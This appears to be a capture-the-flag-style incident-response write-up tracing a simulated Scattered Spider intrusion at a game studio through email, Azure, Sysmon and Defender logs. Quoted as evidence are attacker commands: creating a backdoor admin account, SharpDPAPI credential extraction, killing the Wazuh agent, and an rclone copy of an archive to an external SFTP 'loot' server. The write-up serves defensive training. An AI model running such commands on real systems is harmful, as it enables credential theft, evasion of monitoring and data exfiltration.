---
title: "AB Projekt Blue: End-to-End Investigation"
date: 2026-07-27 14:00:00 +0300
categories: [Incident Response]
tags: [scattered-spider, phishing, mfa-abuse, azure, m365, byovd, ransomware, exfiltration]
description: "End-to-end investigation of a Scattered Spider intrusion at AB Projekt Blue — phishing, MFA abuse, credential theft, BYOVD defense evasion, ransomware, and data exfiltration across Azure, M365, and endpoint telemetry."
image: /assets/img/ab-cover.jpg
---

## Threat Actor: Scattered Spider

This lab simulates an incident inspired by **Scattered Spider**, a financially motivated and highly capable threat actor known for targeting U.S. and global organizations through advanced social engineering, SIM swapping, and abuse of remote access software. The group is notable for its use of legitimate IT tools, identity-centric initial access, and rapid privilege escalation.

Scattered Spider operates in a loosely affiliated structure and often leverages public breach data, MFA fatigue, and help desk impersonation to gain a foothold. Recent campaigns have focused on telecommunications, technology, and critical services, including ransomware deployment in partnership with ALPHV/BlackCat/Qilin/DragonForce operators.

Victims have included high-profile enterprises where attackers leveraged stolen identities, third-party IT access, and living-off-the-land binaries (LOLBins) to blend into enterprise environments while performing internal reconnaissance and data exfiltration.

**References:**
- [CISA Advisory AA23-320A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a)
- [Unit 42 — Muddled Libra](https://unit42.paloaltonetworks.com/muddled-libra/)
- [CrowdStrike — Scattered Spider Escalates Attacks](https://www.crowdstrike.com/en-us/blog/crowdstrike-services-observes-scattered-spider-escalate-attacks/)

## Scoping Note

AB Projekt Blue is a mid-sized European video game development studio known for several major RPG titles under development. In July 2025, cyber defenders and forensic investigators uncovered a multi-phase intrusion attributed to the financially motivated threat actor known as **Scattered Spider** (also tracked as UNC3944, Muddled Libra, Octo Tempest, and 0ktapus).

Scattered Spider is a financially motivated threat actor known for targeting SaaS-heavy organizations using sophisticated social engineering, MFA abuse, and cloud exploitation techniques to gain access, maintain persistence, and extort victims through data theft and ransomware.

As an incident responder assigned to this case, you noticed a sequence of high-fidelity alerts originating from user workstations and cloud services. Initial telemetry flagged suspicious login activity involving a corporate email account, followed by the registration of a new MFA method under unusual conditions.

Your investigation includes:

- KAPE Packages
- RMMs Log Files & Artifacts
- Custom Ransomware Binary
- Emails (.PST)
- PowerShell Transcript Logs
- All logs are sent to an Elastic stack — Windows Event Logs, Azure Logs, M365 Logs

### Network Diagram

![Network diagram](/assets/img/abpb-01.png)

## Phantom Entry Point

Given Scattered Spider's well-documented use of phishing and other social-engineering techniques for initial access, the investigation began by examining potential email-based entry points.

Initial indicators suggested that **Maya Sterling** was the user associated with the beginning of the incident. I therefore started by reviewing the PST mailbox provided as part of the forensic evidence.

The mailbox contained nine messages in the Inbox and eight messages in Sent Items. One message immediately stood out with the subject:

> "Maya's verification failed"

![PST inbox showing the "Maya's verification failed" email](/assets/img/abpb-02.png)

The email appeared to originate from the organization's IT Security / Security Operations Center and informed Maya that she needed to complete a verification process.

Reviewing the Sent Items showed that Maya responded to the message and asked:

> "Yes, what do I need to do?"

![Maya's reply asking what she needs to do](/assets/img/abpb-03.png)

Shortly afterward, Maya received a follow-up email instructing her to complete the verification process using the following link:

`https://login.secureaccesonline.com/...`

The domain `secureaccesonline.com` was particularly suspicious because the email attempted to present itself as legitimate internal IT/security communication while directing the user to an external verification portal.

![Follow-up email containing the phishing verification link](/assets/img/abpb-04.png)

Analysis of the email transport headers identified the sending mail infrastructure. The message was received from:

- **Mail server:** `m32-19.eu.mailgun.net`
- **Observed sending IP:** `141.193.32.19`

The headers also showed that the message was sent using Mailgun infrastructure and that the envelope sender and DKIM signing domain were associated with `secureaccesonline.com`.

Interestingly, the message passed the major email authentication checks:

- **SPF:** Pass
- **DKIM:** Pass
- **DMARC:** Pass

This suggests that the attacker was likely using infrastructure legitimately authorized to send email on behalf of `secureaccesonline.com`, rather than simply spoofing the domain. As a result, traditional email authentication controls alone would not necessarily have prevented the message from reaching the victim.

![Email transport headers showing SPF, DKIM, and DMARC pass](/assets/img/abpb-05.png)

At this stage of the investigation, the email exchange strongly indicated a social-engineering/phishing attempt impersonating the organization's security team, with Maya being directed toward an attacker-controlled verification portal.

## Lurking Access & Persistence

Since the phishing email was received on 21 July at 01:33 AM, I reviewed Azure-related activity in ELK starting from that point.

At 02:12:04, an Azure audit event associated with Maya showed:

> User started the registration for Authenticator App with Code

The source IP was:

`37.231.101.228`

![Azure audit log showing Maya's MFA registration event](/assets/img/abpb-06.png)
![Azure audit log detail for the MFA registration event](/assets/img/abpb-07.png)

Searching for additional activity associated with the same IP revealed that it was also linked to **Priya's** account.

The investigation was then expanded to Priya's workstation, `ABPB-WKS03`. Process telemetry showed `cmd.exe` invoking the locally installed Azure CLI.

The following activity was observed:

- `az vm run-command invoke`
- **Target Resource Group:** `RG-LAB-ABPB-WESTUS2-PROD`
- **Target VM:** `ehvr5d-ABPB-dev01`

This indicates that the actor used Azure CLI to remotely enumerate the network configuration of the Linux VM.

Shortly afterward, `az ssh config` was executed for the same VM, followed by SSH activity to `20.187.49.191`.

![Process telemetry showing Azure CLI and SSH activity on ABPB-WKS03](/assets/img/abpb-08.png)

Reviewing the generated `azure_ssh_config` file showed that the VM was mapped to `20.187.49.191` and that the SSH connection was configured for:

`priya@abprojektblue.onmicrosoft.com`

The public key also contained the comment:

`priya@ABPB-WKS03`

This further links the SSH configuration and key material to Priya's workstation.

![SSH config and key material linked to Priya's workstation](/assets/img/abpb-09.png)

Another finding was the creation of a local account named:

`Adminstrator`

A search across `process.command_line` showed that the account was created using:

```text
net user Adminstrator P@ssw0rd /add
```

It was then added to:

- Administrators
- Remote Desktop Users

This gave the account local administrative privileges and the ability to log on through RDP, assuming RDP was enabled and reachable.

![Adminstrator account added to Administrators and Remote Desktop Users](/assets/img/abpb-10.png)

The investigation was also expanded to Windows service installation events in order to identify the suspicious kernel-mode driver.

Windows Event ID 7045 records the installation of a new system service and is useful for identifying newly registered driver services.

![Windows Event ID 7045 service installation](/assets/img/abpb-11.png)

Reviewing Event ID 7045 revealed a service named:

`killer`

The event showed:

- **Service Type:** kernel mode driver
- **Service Start Type:** demand start

The associated `.sys` file was stored under Priya's Downloads directory and had a filename resembling a SHA-256 hash.

![Killer kernel-mode driver service under Priya's Downloads directory](/assets/img/abpb-12.png)

While reviewing the same Event ID 7045 telemetry, additional suspicious service installations were identified. A service named `PSEXESVC` was installed on `ABPB-WKS02` and later on `ABPB-WKS03`.

`PSEXESVC` is the temporary service commonly created by Sysinternals PsExec during remote command execution. Its presence on both systems provides strong evidence that PsExec was used for remote execution and likely lateral movement within the compromised environment.

The file hash was then checked in VirusTotal. The same hash was associated with the commonly observed filename:

`viragt64.sys`

VirusTotal identified it as a signed Windows kernel driver associated with Vir.IT / TGSoft, while several security vendors classified it as a vulnerable driver.

This finding is consistent with a potential **BYOVD (Bring Your Own Vulnerable Driver)** technique.

![VirusTotal detection for the viragt64.sys kernel driver](/assets/img/abpb-13.png)

## Credential Alchemy

I continued the investigation by reviewing the forensic artifacts collected from `ABPB-WKS02`.

A quick review of the Prefetch directory showed that `SHARPDPAPI.EXE` had been executed on the host.

![Prefetch entry for SHARPDPAPI.EXE](/assets/img/abpb-14.png)

SharpDPAPI is commonly used to interact with Windows DPAPI-protected data such as stored credentials, browser secrets, certificates, and Credential Manager entries.

The PowerShell transcript provided more context and showed the following command executed under Dmitri's user context:

```powershell
.\SharpDPAPI.exe triage
```

![PowerShell transcript showing SharpDPAPI.exe triage](/assets/img/abpb-15.png)
![SharpDPAPI.exe triage output](/assets/img/abpb-16.png)

To identify additional tools introduced by the attacker, I parsed the browser history of the attacker-created `Adminstrator` profile using Hindsight.

After opening the output in Timeline Explorer and filtering for downloads, several suspicious files were identified:

- `SharpDPAPI.exe`
- `SharpMiniDump.exe`
- `PSTools.zip`
- `PPLBlade.exe`

![Downloaded tooling identified via Hindsight browser history parsing](/assets/img/abpb-17.png)

The collection of tools provides a useful picture of the actor's intentions:

- **SharpDPAPI** – DPAPI credential and secret extraction.
- **SharpMiniDump** – process memory dumping, potentially targeting sensitive processes such as LSASS.
- **PsTools** – Microsoft's Sysinternals administrative toolkit, which includes tools such as PsExec and can be abused for remote execution and lateral movement.
- **PPLBlade** – a tool associated with bypassing LSASS Protected Process Light (PPL) protections to enable credential dumping.

Taken together, the downloaded tooling strongly suggests that the actor was preparing for credential extraction and privileged access operations.

The presence of `PPLBlade.exe` was particularly interesting. Microsoft Defender generated a high-severity detection for the file, identifying it as:

`HackTool:Win32/DumpLsass.AA!dha`

with the path:

`C:\Users\Adminstrator\Downloads\PPLBlade.exe`

![Microsoft Defender detection for PPLBlade.exe](/assets/img/abpb-18.png)

Sysmon telemetry additionally showed `PPLBlade.exe` being written to `C:\Users\Adminstrator\Downloads\PPLBlade.exe` by `msedge.exe`.

![Sysmon telemetry showing PPLBlade.exe written by msedge.exe](/assets/img/abpb-19.png)

Further process telemetry revealed several SharpDPAPI commands, including:

```text
SharpDPAPI.exe triage
SharpDPAPI.exe machinetriage
SharpDPAPI.exe machinekeys
SharpDPAPI.exe masterkeys /password:"P@ssw0rd"
SharpDPAPI.exe blob /target:...
```

![Additional SharpDPAPI command executions](/assets/img/abpb-20.png)

This indicates that the actor was not only enumerating DPAPI-protected data, but also attempting to recover master keys and decrypt specific credential blobs.

Finally, the same SharpDPAPI activity was observed across multiple user contexts. It initially appeared under the attacker-created `Adminstrator` account on `ABPB-WKS02`, later under `dmitri`, and subsequently under `priya` on `ABPB-WKS03`.

![SharpDPAPI activity observed across multiple user contexts](/assets/img/abpb-21.png)

Overall, the artifacts show a clear progression toward credential access, with the attacker downloading credential-dumping tooling and repeatedly attempting to extract DPAPI-protected secrets from multiple compromised systems.

## Encrypted Endgame

Intelligence reporting shows that Scattered Spider has worked with established ransomware operators to increase the impact of successful intrusions. After gaining access, stealing credentials, and establishing persistence, the attackers may move into the final impact stage by deploying ransomware across the environment.

Based on that context, I examined the ransomware sample recovered during the incident.

The artifacts included an executable named `main.exe`, together with a text file containing output generated by Sysinternals Strings.

![main.exe artifact and Sysinternals Strings output](/assets/img/abpb-22.png)

A quick review of the extracted strings revealed a Go Build ID, indicating that the binary was compiled using the Go programming language.

![Go Build ID identified in the strings output](/assets/img/abpb-23.png)

Further inspection also exposed a number of imported Windows API functions, including memory-management and thread-related APIs such as:

- `VirtualAlloc`
- `VirtualFree`
- `VirtualQuery`
- `SuspendThread`
- `ResumeThread`
- `GetThreadContext`
- `SetThreadContext`
- `LoadLibraryW`
- `GetProcAddress`

![Imported Windows API functions in the ransomware binary](/assets/img/abpb-24.png)

These imports provide additional insight into the binary's capabilities, although the presence of an API alone does not prove how it is used at runtime.

More importantly, the extracted configuration revealed the ransomware's operational settings. The sample contained a list of directories and file types excluded from encryption, including Windows system locations, Azure monitoring components, recovery-related paths, and temporary files.

It also referenced:

`ransomNotePath: C:\Users\Public\note.txt`

and embedded the ransom-note text directly inside the configuration.

![Ransomware configuration showing exclusions and ransom note path](/assets/img/abpb-25.png)

The exclusions are consistent with an attempt to keep the operating system functional enough for the victim to read the ransom note and potentially interact with the attackers after encryption.

The recovered `note.txt` confirmed the final impact stage of the intrusion.

![Recovered ransom note](/assets/img/abpb-26.png)

The note informed the victim that files had been encrypted and claimed that sensitive documents, credentials, emails, and proprietary data had also been exfiltrated. The attackers demanded a $5 million Bitcoin payment, provided a 72-hour deadline, and supplied an .onion negotiation portal together with a victim-specific login ID and authentication token.

This indicates a double-extortion model: the victim was pressured not only through file encryption, but also through the threat of publishing stolen data.

## Breaking Defenses

Following the credential-access activity, the investigation shifted toward defense evasion. Since Microsoft Defender was active on the affected hosts, I reviewed its malware detections to identify additional tools introduced by the attacker.

Microsoft Defender Event ID 1116 is generated when Defender detects malware or potentially unwanted software, making it a useful starting point for identifying suspicious binaries.

![Microsoft Defender Event ID 1116 detections](/assets/img/abpb-27.png)

Filtering for Event ID 1116 revealed several previously observed tools, including `SharpDPAPI.exe` and `PPLBlade.exe`, as well as additional binaries such as:

- `Blackout.exe`
- `Blackout.sys`
- `killer.exe`
- `SharpMiniDump.exe`

![Additional Defender detections including Blackout and killer.exe](/assets/img/abpb-28.png)
![Defender detection detail](/assets/img/abpb-29.png)

Two findings were especially relevant. Blackout was identified by Defender as malicious, while `killer.exe` was detected as:

`HackTool:Win32/BackStab.A`

The `killer.exe` binary is consistent with BackStab, an EDR-killing tool designed to terminate security products by abusing vulnerable kernel drivers. This directly connects to the `viragt64.sys` driver previously identified and registered through the `killer` service.

The resulting chain is therefore consistent with a BYOVD-based defense-evasion technique:

```text
Vulnerable signed driver
        ↓
registered as kernel service
        ↓
killer.exe / BackStab
        ↓
security process termination
```

Further investigation of `ABPB-WKS03` showed that `killer.exe` was executed under Priya's context and specifically targeted the Wazuh agent. The observed command was:

```text
killer.exe -n wazuh
```

This is particularly significant because Wazuh was part of the endpoint monitoring stack. Terminating the agent would reduce or interrupt telemetry being generated and forwarded from the compromised workstation, decreasing defender visibility during the following stages of the attack.

Around the same period, additional remote-access activity was observed, including the installation or use of AnyDesk, suggesting that the actor was establishing an alternative means of maintaining interactive access after attempting to weaken endpoint defenses.

![AnyDesk installation/usage on the compromised host](/assets/img/abpb-29.png)

At this point, the investigation shows a clear transition from credential access into defense evasion: the attacker introduced a vulnerable kernel driver, deployed an EDR-killing utility, and specifically targeted the host's monitoring agent before continuing deeper into the environment.

## Scattered Portals

I then shifted my focus to the artifacts collected from `ABPB-WKS01`.

Earlier in the investigation, the IP address `37.231.101.228` was linked to the suspicious Authenticator App registration associated with Maya Sterling's account. The same IP later appeared in AnyDesk logs on `ABPB-WKS01` during multiple remote-access attempts.

Because direct connections failed, AnyDesk brokered the sessions through a relay server. The logs show the client connecting from `37.231.101.228` through relay ID:

`e80d2c46`

![AnyDesk relay connection from 37.231.101.228](/assets/img/abpb-30.png)

This strengthens the connection between the identity compromise observed earlier and subsequent remote-access activity on Maya's workstation.

While reviewing the triage image, I also identified artifacts related to Chocolatey. Chocolatey is a Windows package manager commonly used to install and manage software through the command line. Its cache contained package metadata referencing ngrok, even though the files had later been encrypted by the ransomware.

![Chocolatey cache referencing ngrok](/assets/img/abpb-31.png)

ngrok is a legitimate tunneling service that exposes local services through externally accessible tunnels. In an intrusion, it can be abused to bypass inbound network restrictions and provide the attacker with an additional remote-access or tunneling channel.

To confirm that ngrok had actually been executed, I reviewed Sysmon Event ID 1 process-creation events and searched for ngrok. Multiple executions of:

`C:\ProgramData\chocolatey\lib\ngrok\tools\ngrok.exe`

were identified, including:

```text
ngrok agent
ngrok config add-authtoken <token>
```

![Sysmon process-creation events showing ngrok execution](/assets/img/abpb-32.png)

The command-line telemetry therefore confirms that ngrok was not merely downloaded or cached through Chocolatey; it was configured and executed on the compromised host. The presence of the authentication token also indicates that the attacker linked the local ngrok client to an ngrok account before using it.

## Extraction Point

With remote access, credential theft, and defense evasion already established, the investigation moved toward the next objective: data collection and exfiltration.

On `ABPB-WKS03`, the triage image revealed an rclone installation inside Priya's Downloads directory.

![rclone installation in Priya's Downloads directory](/assets/img/abpb-33.png)

rclone is a legitimate command-line utility for transferring data between local systems and remote storage services. Because of its broad protocol support and portable nature, it is also frequently abused during intrusions for data exfiltration.

To determine how it was used, I searched Sysmon Event ID 1 process-creation telemetry for rclone. The command-line history revealed several executions, including:

```text
rclone.exe --config rclone.conf copy C:\Users\priya\Code\cyberfunk.rar do-sftp:/home/lootuser/loot --quiet
```

![rclone copy command exfiltrating cyberfunk.rar](/assets/img/abpb-34.png)

This showed that the actor copied the archive `C:\Users\priya\Code\cyberfunk.rar` to a remote destination configured under the `do-sftp` profile.

Additional commands such as `rclone.exe obscure ...` were also observed, consistent with preparing an obfuscated password value for use inside the rclone configuration.

Network telemetry confirmed outbound communication from `rclone.exe` to:

`206.189.13.43:22`

![Network telemetry showing rclone.exe communicating with 206.189.13.43:22](/assets/img/abpb-35.png)

Port 22 and the configuration artifacts indicate that the transfer was performed over SFTP. The recovered `rclone.conf` confirmed the same destination:

```ini
type = sftp
host = 206.189.13.43
user = lootuser
```

![Recovered rclone.conf configuration](/assets/img/abpb-36.png)

Together, the command line, configuration file, and network telemetry provide strong evidence that `cyberfunk.rar` was exfiltrated from Priya's workstation to the external SFTP server at `206.189.13.43`.

Static inspection of the recovered `rclone.exe` with PEStudio identified an entry point of:

`0x84C60`

![PEStudio entry point analysis of rclone.exe](/assets/img/abpb-37.png)

This value is primarily a binary-analysis detail and does not by itself provide additional evidence of the exfiltration activity.

The investigation also uncovered a second collection path involving Microsoft 365 / SharePoint. Audit events showed repeated `FileDownloaded` operations from:

`abprojektblue.sharepoint.com/sites/CyberFunk/`

under Maya's account. The recorded user agent was:

`python-requests/2.31.0`

![M365 audit log showing FileDownloaded operations via python-requests](/assets/img/abpb-38.png)

The repeated downloads through the Python requests library are unusual compared with normal interactive browser access and are consistent with an automated script being used to enumerate or retrieve files from the organization's SharePoint environment.

This suggests that the actor was collecting data from both endpoint storage and cloud-hosted repositories.

Additional evidence was recovered from the AnyDesk artifacts on `ABPB-WKS02`. The `file_transfer_trace` showed transfers involving:

- `public.key`
- `main.exe`

through the AnyDesk clipboard/file-transfer mechanism.

![AnyDesk file_transfer_trace showing public.key and main.exe](/assets/img/abpb-39.png)

One important correction is that these records are marked as downloads. Therefore, the artifact supports the conclusion that `public.key` and `main.exe` were transferred onto the compromised workstation through AnyDesk, rather than exfiltrated from it.

Given that `main.exe` was later identified as the ransomware payload, `public.key` was likely supporting cryptographic material associated with the ransomware operation. However, its exact role should not be stated conclusively without analyzing the key and the ransomware's encryption logic.

Finally, RDP bitmap-cache artifacts provided a visual record of the attacker's interactive activity. Recovered screen fragments showed the actor browsing internal development resources, repositories, and project directories during an RDP session.

![RDP bitmap-cache fragments showing attacker interactive activity](/assets/img/abpb-40.png)

## Certificate of Completion

![Lab completion certificate](/assets/img/abpb-certificate.png)
